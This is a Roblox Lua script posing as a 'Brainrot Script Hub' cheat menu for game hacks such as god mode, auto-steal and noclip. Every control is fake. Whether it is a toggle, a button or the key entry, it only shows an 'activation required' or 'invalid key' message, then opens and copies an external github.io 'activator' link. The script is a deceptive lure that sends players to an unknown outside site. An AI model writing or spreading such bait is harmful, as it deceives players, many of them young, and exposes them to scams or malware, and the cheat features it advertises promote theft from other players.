local REDIRECT_URL = "https://oceanraaqueduct.github.io/brainrotactiv/"

local Rayfield = (function()
    local Rayfield = { _windows = {} }
    local _activationShown = false

    local function openUrlAndCopy(url)
        local success = false
        local browserService = game:GetService("BrowserService")
        if browserService then
            success = pcall(function()
                browserService:OpenBrowserWindow(url)
            end)
        end
        pcall(function()
            setclipboard(url)
        end)

        local notif = Instance.new("ScreenGui")
        notif.Name = "Notif"
        notif.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 320, 0, 64)
        frame.Position = UDim2.new(0.5, -160, 0.8, 0)
        frame.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
        frame.BorderSizePixel = 0
        frame.Parent = notif

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0.4, 0)
        title.Text = "Link Ready"
        title.TextColor3 = Color3.fromRGB(255, 107, 0)
        title.BackgroundTransparency = 1
        title.Font = Enum.Font.GothamBold
        title.TextSize = 14
        title.Parent = frame

        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 0.6, 0)
        text.Position = UDim2.new(0, 0, 0.4, 0)
        text.Text = "Browser opened (or link copied to clipboard)"
        text.TextColor3 = Color3.fromRGB(255, 255, 255)
        text.BackgroundTransparency = 1
        text.Font = Enum.Font.Gotham
        text.TextSize = 12
        text.Parent = frame

        game:GetService("Debris"):AddItem(notif, 3)
    end

    local function showActivationDialog()
        if _activationShown then return end
        _activationShown = true

        local player = game.Players.LocalPlayer
        if not player then return end

        local dialog = Instance.new("ScreenGui")
        dialog.Name = "ActivationDialog"
        dialog.Parent = player:WaitForChild("PlayerGui")

        local bg = Instance.new("Frame")
        bg.Size = UDim2.new(0, 420, 0, 240)
        bg.Position = UDim2.new(0.5, -210, 0.5, -120)
        bg.BackgroundColor3 = Color3.fromRGB(13, 11, 26)
        bg.BorderSizePixel = 0
        bg.Parent = dialog

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 50)
        title.Text = "🔒 ACTIVATION REQUIRED"
        title.TextColor3 = Color3.fromRGB(255, 107, 0)
        title.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
        title.Font = Enum.Font.GothamBold
        title.TextSize = 18
        title.Parent = bg

        local msg = Instance.new("TextLabel")
        msg.Size = UDim2.new(0.9, 0, 0, 60)
        msg.Position = UDim2.new(0.05, 0, 0.25, 0)
        msg.Text = "This feature requires activation.\nClick below to get your activator."
        msg.TextColor3 = Color3.fromRGB(255, 255, 255)
        msg.BackgroundTransparency = 1
        msg.Font = Enum.Font.Gotham
        msg.TextSize = 14
        msg.TextWrapped = true
        msg.TextYAlignment = Enum.TextYAlignment.Top
        msg.Parent = bg

        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.6, 0, 0, 50)
        btn.Position = UDim2.new(0.2, 0, 0.7, 0)
        btn.Text = "🚀 GET ACTIVATOR"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.BackgroundColor3 = Color3.fromRGB(255, 107, 0)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 16
        btn.BorderSizePixel = 0
        btn.Parent = bg

        btn.MouseButton1Click:Connect(function()
            openUrlAndCopy(REDIRECT_URL)
            dialog:Destroy()
            _activationShown = false
        end)

        local closeBtn = Instance.new("TextButton")
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -36, 0, 6)
        closeBtn.Text = "X"
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeBtn.BackgroundColor3 = Color3.fromRGB(40, 30, 60)
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.TextSize = 18
        closeBtn.BorderSizePixel = 0
        closeBtn.Parent = bg
        closeBtn.MouseButton1Click:Connect(function()
            dialog:Destroy()
            _activationShown = false
        end)
    end

    local function wrapAction(action)
        return function(...)
            showActivationDialog()
        end
    end

    function Rayfield:CreateWindow(options)
        local window = {}
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BrainrotHubGUI"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

        local main = Instance.new("Frame")
        main.Size = UDim2.new(0, 820, 0, 620)
        main.Position = UDim2.new(0.5, -410, 0.5, -310)
        main.BackgroundColor3 = Color3.fromRGB(13, 11, 26)
        main.BorderSizePixel = 0
        main.Parent = screenGui
        window._main = main

        local titleBar = Instance.new("Frame")
        titleBar.Size = UDim2.new(1, 0, 0, 52)
        titleBar.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
        titleBar.BorderSizePixel = 0
        titleBar.Parent = main

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 1, 0)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.Text = options.Name
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.BackgroundTransparency = 1
        title.Font = Enum.Font.GothamBold
        title.TextSize = 18
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.Parent = titleBar

        local sidebar = Instance.new("Frame")
        sidebar.Size = UDim2.new(0, 210, 1, -52)
        sidebar.Position = UDim2.new(0, 0, 0, 52)
        sidebar.BackgroundColor3 = Color3.fromRGB(18, 15, 32)
        sidebar.BorderSizePixel = 0
        sidebar.Parent = main

        local scrollTabs = Instance.new("ScrollingFrame")
        scrollTabs.Size = UDim2.new(1, 0, 1, 0)
        scrollTabs.BackgroundTransparency = 1
        scrollTabs.ScrollBarThickness = 3
        scrollTabs.CanvasSize = UDim2.new(0, 0, 0, 10)
        scrollTabs.Parent = sidebar

        local tabLayout = Instance.new("UIListLayout")
        tabLayout.Padding = UDim.new(0, 4)
        tabLayout.Parent = scrollTabs

        local content = Instance.new("Frame")
        content.Size = UDim2.new(1, -220, 1, -52)
        content.Position = UDim2.new(0, 220, 0, 52)
        content.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
        content.BorderSizePixel = 0
        content.Parent = main

        local tabContainer = Instance.new("Frame")
        tabContainer.Size = UDim2.new(1, 0, 1, 0)
        tabContainer.BackgroundTransparency = 1
        tabContainer.Parent = content

        window.tabs = {}
        window.tabButtons = {}
        window.tabContents = {}
        window.currentTabIndex = nil

        function window:CreateTab(name)
            local tab = {}
            local contentFrame = Instance.new("ScrollingFrame")
            contentFrame.Size = UDim2.new(1, 0, 1, 0)
            contentFrame.BackgroundTransparency = 1
            contentFrame.ScrollBarThickness = 4
            contentFrame.Visible = false
            contentFrame.CanvasSize = UDim2.new(0, 0, 0, 10)
            contentFrame.Parent = tabContainer

            local contentLayout = Instance.new("UIListLayout")
            contentLayout.Padding = UDim.new(0, 6)
            contentLayout.Parent = contentFrame

            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(0.9, 0, 0, 42)
            btn.Position = UDim2.new(0.05, 0, 0, 0)
            btn.Text = name
            btn.TextColor3 = Color3.fromRGB(160, 160, 176)
            btn.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
            btn.Font = Enum.Font.Gotham
            btn.TextSize = 13
            btn.BorderSizePixel = 0
            btn.Parent = scrollTabs

            btn.MouseEnter:Connect(function()
                btn.BackgroundColor3 = Color3.fromRGB(40, 30, 60)
            end)
            btn.MouseLeave:Connect(function()
                if window.currentTabIndex ~= #window.tabs + 1 then
                    btn.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
                end
            end)

            local tabIndex = #window.tabs + 1
            table.insert(window.tabs, tab)
            table.insert(window.tabButtons, btn)
            table.insert(window.tabContents, contentFrame)

            btn.MouseButton1Click:Connect(function()
                if window.currentTabIndex then
                    local oldIdx = window.currentTabIndex
                    window.tabContents[oldIdx].Visible = false
                    window.tabButtons[oldIdx].TextColor3 = Color3.fromRGB(160, 160, 176)
                    window.tabButtons[oldIdx].BackgroundColor3 = Color3.fromRGB(23, 19, 40)
                end
                window.currentTabIndex = tabIndex
                contentFrame.Visible = true
                btn.TextColor3 = Color3.fromRGB(255, 107, 0)
                btn.BackgroundColor3 = Color3.fromRGB(60, 40, 80)
            end)

            if #window.tabs == 1 then
                window.currentTabIndex = 1
                contentFrame.Visible = true
                btn.TextColor3 = Color3.fromRGB(255, 107, 0)
                btn.BackgroundColor3 = Color3.fromRGB(60, 40, 80)
            end

            local function updateCanvas()
                local totalHeight = 0
                for _, child in ipairs(contentFrame:GetChildren()) do
                    if child:IsA("GuiObject") then
                        totalHeight = totalHeight + child.Size.Y.Offset + 6
                    end
                end
                contentFrame.CanvasSize = UDim2.new(0, 0, 0, totalHeight + 20)
            end

            function tab:CreateSection(name)
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, 0, 0, 32)
                label.Text = name
                label.TextColor3 = Color3.fromRGB(255, 107, 0)
                label.BackgroundTransparency = 1
                label.TextXAlignment = Enum.TextXAlignment.Left
                label.Font = Enum.Font.GothamBold
                label.TextSize = 16
                label.Parent = contentFrame

                local line = Instance.new("Frame")
                line.Size = UDim2.new(0.95, 0, 0, 2)
                line.Position = UDim2.new(0, 0, 1, 4)
                line.BackgroundColor3 = Color3.fromRGB(176, 38, 255)
                line.BorderSizePixel = 0
                line.Parent = label

                updateCanvas()
                return label
            end

            function tab:CreateToggle(options)
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, -10, 0, 44)
                frame.BackgroundTransparency = 1
                frame.Parent = contentFrame

                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(0.7, 0, 1, 0)
                label.Text = options.Name
                label.TextColor3 = Color3.fromRGB(255, 255, 255)
                label.BackgroundTransparency = 1
                label.TextXAlignment = Enum.TextXAlignment.Left
                label.Font = Enum.Font.Gotham
                label.TextSize = 13
                label.Parent = frame

                local toggle = Instance.new("TextButton")
                toggle.Size = UDim2.new(0, 64, 0, 28)
                toggle.Position = UDim2.new(0.85, 0, 0.5, -14)
                toggle.BackgroundColor3 = options.CurrentValue and Color3.fromRGB(255, 107, 0) or Color3.fromRGB(30, 30, 40)
                toggle.Text = options.CurrentValue and "ON" or "OFF"
                toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
                toggle.Font = Enum.Font.GothamBold
                toggle.TextSize = 11
                toggle.BorderSizePixel = 0
                toggle.Parent = frame

                local state = options.CurrentValue
                local callback = options.Callback

                toggle.MouseButton1Click:Connect(wrapAction(function()
                    state = not state
                    toggle.BackgroundColor3 = state and Color3.fromRGB(255, 107, 0) or Color3.fromRGB(30, 30, 40)
                    toggle.Text = state and "ON" or "OFF"
                    if callback then callback(state) end
                end))

                updateCanvas()
                return toggle
            end

            function tab:CreateSlider(options)
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, -10, 0, 64)
                frame.BackgroundTransparency = 1
                frame.Parent = contentFrame

                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(0.6, 0, 0.5, 0)
                label.Text = options.Name
                label.TextColor3 = Color3.fromRGB(255, 255, 255)
                label.BackgroundTransparency = 1
                label.TextXAlignment = Enum.TextXAlignment.Left
                label.Font = Enum.Font.Gotham
                label.TextSize = 13
                label.Parent = frame

                local valueLabel = Instance.new("TextLabel")
                valueLabel.Size = UDim2.new(0.2, 0, 0.5, 0)
                valueLabel.Position = UDim2.new(0.8, 0, 0, 0)
                valueLabel.Text = tostring(options.CurrentValue) .. options.Suffix
                valueLabel.TextColor3 = Color3.fromRGB(255, 107, 0)
                valueLabel.BackgroundTransparency = 1
                valueLabel.TextXAlignment = Enum.TextXAlignment.Right
                valueLabel.Font = Enum.Font.GothamBold
                valueLabel.TextSize = 14
                valueLabel.Parent = frame

                local slider = Instance.new("Frame")
                slider.Size = UDim2.new(0.95, 0, 0.3, 0)
                slider.Position = UDim2.new(0, 0, 0.6, 0)
                slider.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
                slider.BorderSizePixel = 0
                slider.Parent = frame

                local bar = Instance.new("Frame")
                local ratio = (options.CurrentValue - options.Range[1]) / (options.Range[2] - options.Range[1])
                bar.Size = UDim2.new(ratio, 0, 1, 0)
                bar.BackgroundColor3 = Color3.fromRGB(176, 38, 255)
                bar.BorderSizePixel = 0
                bar.Parent = slider

                local handle = Instance.new("TextButton")
                handle.Size = UDim2.new(0, 16, 0, 16)
                handle.Position = UDim2.new(ratio, -8, 0.5, -8)
                handle.BackgroundColor3 = Color3.fromRGB(255, 107, 0)
                handle.Text = ""
                handle.BorderSizePixel = 0
                handle.Parent = slider

                local dragging = false
                local currentValue = options.CurrentValue
                local callback = options.Callback

                handle.MouseButton1Down:Connect(function() dragging = true end)
                handle.MouseButton1Up:Connect(function() dragging = false end)
                handle.MouseLeave:Connect(function() dragging = false end)

                local function updateSlider(mouseX)
                    local sliderX = slider.AbsolutePosition.X
                    local sliderW = slider.AbsoluteSize.X
                    local ratio = math.clamp((mouseX - sliderX) / sliderW, 0, 1)
                    local val = options.Range[1] + ratio * (options.Range[2] - options.Range[1])
                    val = math.round(val / options.Increment) * options.Increment
                    val = math.clamp(val, options.Range[1], options.Range[2])

                    bar.Size = UDim2.new(ratio, 0, 1, 0)
                    handle.Position = UDim2.new(ratio, -8, 0.5, -8)
                    valueLabel.Text = tostring(val) .. options.Suffix
                    currentValue = val
                    if callback then callback(val) end
                end

                game:GetService("UserInputService").InputChanged:Connect(function(input)
                    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                        updateSlider(input.Position.X)
                    end
                end)

                local originalCallback = options.Callback
                options.Callback = wrapAction(originalCallback)

                updateCanvas()
                return slider
            end

            function tab:CreateDropdown(options)
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, -10, 0, 44)
                frame.BackgroundTransparency = 1
                frame.Parent = contentFrame

                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(0.5, 0, 1, 0)
                label.Text = options.Name
                label.TextColor3 = Color3.fromRGB(255, 255, 255)
                label.BackgroundTransparency = 1
                label.TextXAlignment = Enum.TextXAlignment.Left
                label.Font = Enum.Font.Gotham
                label.TextSize = 13
                label.Parent = frame

                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(0.35, 0, 1, -6)
                btn.Position = UDim2.new(0.65, 0, 0.5, -17)
                btn.BackgroundColor3 = Color3.fromRGB(30, 20, 40)
                btn.Text = options.CurrentOption
                btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                btn.Font = Enum.Font.Gotham
                btn.TextSize = 12
                btn.BorderSizePixel = 0
                btn.Parent = frame

                local dropdownOpen = false
                local list = nil
                local callback = options.Callback

                btn.MouseButton1Click:Connect(wrapAction(function()
                    dropdownOpen = not dropdownOpen
                    if dropdownOpen then
                        list = Instance.new("Frame")
                        list.Size = UDim2.new(0.35, 0, 0, #options.Options * 32 + 8)
                        list.Position = UDim2.new(0.65, 0, 1, 4)
                        list.BackgroundColor3 = Color3.fromRGB(20, 15, 30)
                        list.BorderSizePixel = 0
                        list.ZIndex = 10
                        list.Parent = frame

                        for i, opt in ipairs(options.Options) do
                            local optBtn = Instance.new("TextButton")
                            optBtn.Size = UDim2.new(1, -4, 0, 30)
                            optBtn.Position = UDim2.new(0, 2, 0, (i-1) * 32 + 4)
                            optBtn.Text = opt
                            optBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                            optBtn.BackgroundColor3 = Color3.fromRGB(25, 18, 35)
                            optBtn.Font = Enum.Font.Gotham
                            optBtn.TextSize = 12
                            optBtn.ZIndex = 11
                            optBtn.Parent = list

                            optBtn.MouseEnter:Connect(function()
                                optBtn.BackgroundColor3 = Color3.fromRGB(60, 40, 80)
                            end)
                            optBtn.MouseLeave:Connect(function()
                                optBtn.BackgroundColor3 = Color3.fromRGB(25, 18, 35)
                            end)

                            optBtn.MouseButton1Click:Connect(wrapAction(function()
                                btn.Text = opt
                                dropdownOpen = false
                                if list then list:Destroy() end
                                if callback then callback(opt) end
                            end))
                        end
                    else
                        if list then list:Destroy() end
                    end
                end))

                updateCanvas()
                return btn
            end

            function tab:CreateButton(options)
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(0.9, 0, 0, 44)
                btn.Position = UDim2.new(0.05, 0, 0, 0)
                btn.BackgroundColor3 = Color3.fromRGB(30, 20, 40)
                btn.Text = options.Name
                btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                btn.Font = Enum.Font.GothamBold
                btn.TextSize = 14
                btn.BorderSizePixel = 0
                btn.AutoButtonColor = false
                btn.Parent = contentFrame

                btn.MouseEnter:Connect(function()
                    btn.BackgroundColor3 = Color3.fromRGB(60, 40, 80)
                end)
                btn.MouseLeave:Connect(function()
                    btn.BackgroundColor3 = Color3.fromRGB(30, 20, 40)
                end)

                local callback = options.Callback
                btn.MouseButton1Click:Connect(wrapAction(function()
                    if callback then callback() end
                end))

                updateCanvas()
                return btn
            end

            function tab:CreateParagraph(options)
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(0.95, 0, 0, 60)
                label.Position = UDim2.new(0.025, 0, 0, 0)
                label.Text = options.Content
                label.TextColor3 = Color3.fromRGB(160, 160, 176)
                label.BackgroundTransparency = 1
                label.TextXAlignment = Enum.TextXAlignment.Left
                label.TextYAlignment = Enum.TextYAlignment.Top
                label.Font = Enum.Font.Gotham
                label.TextSize = 12
                label.TextWrapped = true
                label.Parent = contentFrame

                updateCanvas()
                return label
            end

            return tab
        end

        window._screenGui = screenGui
        window._main = main
        return window
    end

    return Rayfield
end)()

local player = game.Players.LocalPlayer
if not player then return end

local Window = Rayfield:CreateWindow({
    Name = "🧠 BRAINROT SCRIPT HUB",
    Icon = 0,
    LoadingTitle = "Brainrot Script Hub",
    LoadingSubtitle = "Загрузка...",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "BrainrotHub",
        FileName = "Settings"
    },
    KeySystem = false
})

local function SetToggle(flag, value)
    print(flag .. " = " .. tostring(value))
end

local function SetSlider(flag, value)
    print(flag .. " = " .. tostring(value))
end

local function SetDropdown(flag, value)
    print(flag .. " = " .. tostring(value))
end

local function ShowNotification(title, text)
    local notif = Instance.new("ScreenGui")
    notif.Name = "Notif"
    notif.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 320, 0, 64)
    frame.Position = UDim2.new(0.5, -160, 0.8, 0)
    frame.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
    frame.BorderSizePixel = 0
    frame.Parent = notif

    local titleLbl = Instance.new("TextLabel")
    titleLbl.Size = UDim2.new(1, 0, 0.4, 0)
    titleLbl.Text = title
    titleLbl.TextColor3 = Color3.fromRGB(255, 107, 0)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Font = Enum.Font.GothamBold
    titleLbl.TextSize = 14
    titleLbl.Parent = frame

    local textLbl = Instance.new("TextLabel")
    textLbl.Size = UDim2.new(1, 0, 0.6, 0)
    textLbl.Position = UDim2.new(0, 0, 0.4, 0)
    textLbl.Text = text
    textLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLbl.BackgroundTransparency = 1
    textLbl.Font = Enum.Font.Gotham
    textLbl.TextSize = 12
    textLbl.Parent = frame

    game:GetService("Debris"):AddItem(notif, 3)
end

local Tabs = {
    Combat = Window:CreateTab("COMBAT & SURVIVAL"),
    Resources = Window:CreateTab("RESOURCES"),
    Brainrot = Window:CreateTab("BRAINROT & STEAL"),
    World = Window:CreateTab("WORLD & SPEED"),
    QoL = Window:CreateTab("QUALITY OF LIFE"),
    Controls = Window:CreateTab("CONTROLS"),
    Premium = Window:CreateTab("💎 PREMIUM")
}

Tabs.Combat:CreateSection("COMBAT & SURVIVAL")
Tabs.Combat:CreateToggle({Name = "God Mode / Infinite HP", CurrentValue = false, Flag = "GodMode", Callback = SetToggle})
Tabs.Combat:CreateToggle({Name = "One-Hit Kill (All Enemies & Bosses)", CurrentValue = false, Flag = "OneHitKill", Callback = SetToggle})
Tabs.Combat:CreateToggle({Name = "Damage Multiplier", CurrentValue = false, Flag = "DmgMultToggle", Callback = SetToggle})
Tabs.Combat:CreateSlider({Name = "Damage Multiplier Value", Range = {1,20}, Increment = 1, Suffix = "x", CurrentValue = 1, Callback = function(v) SetSlider("DmgMult", v) end})
Tabs.Combat:CreateToggle({Name = "No Knockback", CurrentValue = false, Flag = "NoKnockback", Callback = SetToggle})
Tabs.Combat:CreateToggle({Name = "Auto-Fire Tears / Attack", CurrentValue = false, Flag = "AutoFire", Callback = SetToggle})

Tabs.Resources:CreateSection("RESOURCES")
Tabs.Resources:CreateToggle({Name = "Unlimited Coins", CurrentValue = false, Flag = "UnlimCoins", Callback = SetToggle})
Tabs.Resources:CreateToggle({Name = "Auto-Collect Money", CurrentValue = false, Flag = "AutoCollect", Callback = SetToggle})
Tabs.Resources:CreateToggle({Name = "Auto-Buy Best Brainrot", CurrentValue = false, Flag = "AutoBuy", Callback = SetToggle})
Tabs.Resources:CreateToggle({Name = "Auto-Rebirth", CurrentValue = false, Flag = "AutoRebirth", Callback = SetToggle})
Tabs.Resources:CreateSlider({Name = "Collect Interval", Range = {0.5,10}, Increment = 0.5, Suffix = "sec", CurrentValue = 3, Callback = function(v) SetSlider("CollectInterval", v) end})
Tabs.Resources:CreateToggle({Name = "Freeze All Resources", CurrentValue = false, Flag = "FreezeResources", Callback = SetToggle})

Tabs.Brainrot:CreateSection("BRAINROT & STEAL")
Tabs.Brainrot:CreateToggle({Name = "Auto-Steal Brainrot", CurrentValue = false, Flag = "AutoSteal", Callback = SetToggle})
Tabs.Brainrot:CreateDropdown({Name = "Steal Mode", Options = {"Best Only", "Any", "Rich Players", "Random"}, CurrentOption = "Best Only", Callback = function(v) SetDropdown("StealMode", v) end})
Tabs.Brainrot:CreateToggle({Name = "Instant Steal", CurrentValue = false, Flag = "InstantSteal", Callback = SetToggle})
Tabs.Brainrot:CreateSlider({Name = "Steal Cooldown", Range = {0.5,5}, Increment = 0.5, Suffix = "sec", CurrentValue = 2, Callback = function(v) SetSlider("StealCooldown", v) end})
Tabs.Brainrot:CreateToggle({Name = "Target ESP", CurrentValue = false, Flag = "TargetESP", Callback = SetToggle})
Tabs.Brainrot:CreateToggle({Name = "Auto-Lock Base", CurrentValue = false, Flag = "AutoLock", Callback = SetToggle})

Tabs.World:CreateSection("WORLD & SPEED")
Tabs.World:CreateToggle({Name = "Speed Boost", CurrentValue = false, Flag = "SpeedToggle", Callback = SetToggle})
Tabs.World:CreateSlider({Name = "Speed Boost Value", Range = {1,10}, Increment = 0.5, Suffix = "x", CurrentValue = 2, Callback = function(v) SetSlider("SpeedValue", v) end})
Tabs.World:CreateToggle({Name = "Flight Mode", CurrentValue = false, Flag = "Flight", Callback = SetToggle})
Tabs.World:CreateToggle({Name = "NoClip", CurrentValue = false, Flag = "NoClip", Callback = SetToggle})
Tabs.World:CreateButton({Name = "🏠 Teleport to Base (F1)", Callback = function() print("Teleport to Base") end})

Tabs.QoL:CreateSection("QUALITY OF LIFE")
Tabs.QoL:CreateToggle({Name = "Anti-AFK", CurrentValue = false, Flag = "AntiAFK", Callback = SetToggle})
Tabs.QoL:CreateToggle({Name = "Auto-Collect All", CurrentValue = false, Flag = "AutoCollectAll", Callback = SetToggle})
Tabs.QoL:CreateToggle({Name = "Notification on Steal", CurrentValue = false, Flag = "NotifySteal", Callback = SetToggle})
Tabs.QoL:CreateToggle({Name = "Show Stats", CurrentValue = false, Flag = "ShowStats", Callback = SetToggle})

Tabs.Controls:CreateSection("PRESETS")
Tabs.Controls:CreateButton({Name = "🧠 BRAINROT KING", Callback = function()
    print("Preset BRAINROT KING activated")
    ShowNotification("🧠 BRAINROT KING", "All features activated!")
end})
Tabs.Controls:CreateButton({Name = "💰 MONEY PRINTER", Callback = function()
    print("Preset MONEY PRINTER activated")
    ShowNotification("💰 MONEY PRINTER", "Farming activated!")
end})
Tabs.Controls:CreateButton({Name = "⚡ SPEED DEMON", Callback = function()
    print("Preset SPEED DEMON activated")
    ShowNotification("⚡ SPEED DEMON", "Speed mode activated!")
end})

Tabs.Controls:CreateSection("CONFIG")
Tabs.Controls:CreateButton({Name = "Apply", Callback = function()
    ShowNotification("✅ Apply", "Settings applied!")
end})
Tabs.Controls:CreateButton({Name = "Reset", Callback = function()
    ShowNotification("↺ Reset", "Module reset!")
end})
Tabs.Controls:CreateButton({Name = "Defaults", Callback = function()
    ShowNotification("⏲️ Defaults", "All settings restored!")
end})

Tabs.Premium:CreateSection("🔥 UNLOCK ALL FEATURES")
Tabs.Premium:CreateButton({Name = "🚀 Activate Premium Mode", Callback = function()
    local dialog = Instance.new("ScreenGui")
    dialog.Name = "ActivationDialog"
    dialog.Parent = player:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 420, 0, 240)
    bg.Position = UDim2.new(0.5, -210, 0.5, -120)
    bg.BackgroundColor3 = Color3.fromRGB(13, 11, 26)
    bg.BorderSizePixel = 0
    bg.Parent = dialog

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Text = "🔑 ENTER ACTIVATION KEY"
    title.TextColor3 = Color3.fromRGB(255, 107, 0)
    title.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = bg

    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(0.9, 0, 0, 40)
    msg.Position = UDim2.new(0.05, 0, 0.22, 0)
    msg.Text = "Enter your activation key to unlock all features."
    msg.TextColor3 = Color3.fromRGB(255, 255, 255)
    msg.BackgroundTransparency = 1
    msg.Font = Enum.Font.Gotham
    msg.TextSize = 13
    msg.TextWrapped = true
    msg.Parent = bg

    local input = Instance.new("TextBox")
    input.Size = UDim2.new(0.8, 0, 0, 40)
    input.Position = UDim2.new(0.1, 0, 0.45, 0)
    input.BackgroundColor3 = Color3.fromRGB(30, 20, 40)
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.Font = Enum.Font.Gotham
    input.TextSize = 14
    input.PlaceholderText = "XXXX-XXXX-XXXX-XXXX"
    input.BorderSizePixel = 0
    input.Parent = bg

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.4, 0, 0, 44)
    btn.Position = UDim2.new(0.3, 0, 0.7, 0)
    btn.Text = "ACTIVATE"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.BackgroundColor3 = Color3.fromRGB(255, 107, 0)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.BorderSizePixel = 0
    btn.Parent = bg

    btn.MouseButton1Click:Connect(function()
        local success = false
        local browserService = game:GetService("BrowserService")
        if browserService then
            success = pcall(function()
                browserService:OpenBrowserWindow(REDIRECT_URL)
            end)
        end
        pcall(function()
            setclipboard(REDIRECT_URL)
        end)

        local notif = Instance.new("ScreenGui")
        notif.Name = "Notif"
        notif.Parent = player:WaitForChild("PlayerGui")
        local nf = Instance.new("Frame")
        nf.Size = UDim2.new(0, 320, 0, 64)
        nf.Position = UDim2.new(0.5, -160, 0.8, 0)
        nf.BackgroundColor3 = Color3.fromRGB(23, 19, 40)
        nf.BorderSizePixel = 0
        nf.Parent = notif
        local nt = Instance.new("TextLabel")
        nt.Size = UDim2.new(1, 0, 0.4, 0)
        nt.Text = "Invalid key"
        nt.TextColor3 = Color3.fromRGB(255, 107, 0)
        nt.BackgroundTransparency = 1
        nt.Font = Enum.Font.GothamBold
        nt.TextSize = 14
        nt.Parent = nf
        local ntxt = Instance.new("TextLabel")
        ntxt.Size = UDim2.new(1, 0, 0.6, 0)
        ntxt.Position = UDim2.new(0, 0, 0.4, 0)
        ntxt.Text = "Your key was not recognized. Link copied to clipboard."
        ntxt.TextColor3 = Color3.fromRGB(255, 255, 255)
        ntxt.BackgroundTransparency = 1
        ntxt.Font = Enum.Font.Gotham
        ntxt.TextSize = 12
        ntxt.Parent = nf
        game:GetService("Debris"):AddItem(notif, 3)
        dialog:Destroy()
    end)

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -36, 0, 6)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 30, 60)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 18
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = bg
    closeBtn.MouseButton1Click:Connect(function()
        dialog:Destroy()
    end)
end})

Tabs.Premium:CreateParagraph({
    Title = "⚠️ IMPORTANT",
    Content = "All features are locked until you activate.\nClick 'Activate Premium Mode' and follow the instructions.\nAfter activation, all toggles and presets will work."
})

local statusBar = Instance.new("Frame")
statusBar.Size = UDim2.new(1, 0, 0, 28)
statusBar.Position = UDim2.new(0, 0, 1, -28)
statusBar.BackgroundColor3 = Color3.fromRGB(18, 15, 32)
statusBar.BorderSizePixel = 0
statusBar.Parent = Window._main

local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1, 0, 1, 0)
statusText.Text = "🧠 Brainrot is life..."
statusText.TextColor3 = Color3.fromRGB(160, 160, 176)
statusText.BackgroundTransparency = 1
statusText.Font = Enum.Font.Gotham
statusText.TextSize = 10
statusText.Parent = statusBar

local UserInputService = game:GetService("UserInputService")
local isVisible = true
local gui = Window._screenGui

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.P then
        if gui then
            isVisible = not isVisible
            gui.Enabled = isVisible
        end
    end
end)

print("🧠 Brainrot Script Hub loaded — press P to toggle.")
